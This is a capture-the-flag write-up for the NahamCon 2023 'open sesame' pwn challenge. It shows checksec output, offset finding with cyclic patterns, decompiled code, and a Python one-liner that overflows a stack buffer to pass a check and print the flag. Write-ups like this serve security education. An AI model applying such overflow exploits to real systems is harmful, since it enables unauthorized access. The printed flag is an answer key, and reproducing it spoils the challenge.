Nahamcon2023

pwn

open sesame

$ file open_sesame
open_sesame: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2525dc7633f9c705274ef4a606c1d93e5eaf1965, for GNU/Linux 3.2.0, not stripped

$ checksec --file open_sesame
[*] '/home/kali/CTF/BlueGh05t/CTF/nahamcon2023/pwn/opensesame/open_sesame'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled


$ ./open_sesame                               
BEHOLD THE CAVE OF GOLD

What is the magic enchantment that opens the mouth of the cave?
HELLO

** Entering a ton of characters gives us a segfault.  Maybe there's a buffer overflow we can exploit

$ gdb-pwndbg open_sesame  

$ cyclic 300

$ run

* paste in the pattern

$ cyclic -l kaaaaab

$ offset found at 280

* Open open_sesame in ghidra

void caveOfGold(void)

{
  int iVar1;
  undefined local_118 [268];
  int local_c;
  
  local_c = 0;
  puts("BEHOLD THE CAVE OF GOLD\n");
  puts("What is the magic enchantment that opens the mouth of the cave?");
  flushBuffers();
  __isoc99_scanf(&DAT_00102088,local_118);
  if (local_c == 0) {
    puts("Sorry, the cave will not open right now!");
    flushBuffers();
  }
  else {
    iVar1 = isPasswordCorrect(local_118);
    if (iVar1 == 1) {
      puts("YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:");
      flag();
    }
    else {
      puts("ERROR, INCORRECT PASSWORD!");
      flushBuffers();
    }
  }
  return;
}

* So we have a buffer, then the local_c variable (initiated to 0).
* Further down we see the function checks to see if local_c = 0, and exits if that's true.
* So we need to overwrite the value of local_c to anything other than 0.  
* BUT, we don't want to overflow the buffer as wew only need to get past this check on local_c
* HOWEVER, we also need to input the correct password:


bool isPasswordCorrect(char *param_1)

{
  int iVar1;
  
  iVar1 = strncmp(param_1,"OpenSesame!!!",0xd);
  return iVar1 == 0;
}

* password is 'OpenSesame!!!' - the strncmp is only looking at the first 13 bytes. 

* So now we have our plan - we need to provide the program with less than 280 bytes (the amount of data which will overflow the buffer), with the first 13 bytes being the password.

$ python -c 'print("OpenSesame!!!" + "1"*270)'


$ nc challenge.nahamcon.com 32743                                                                                139 ⨯
BEHOLD THE CAVE OF GOLD

What is the magic enchantment that opens the mouth of the cave?
OpenSesame!!!111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:
flag{85605e34d3d2623866c57843a0d2c4da}

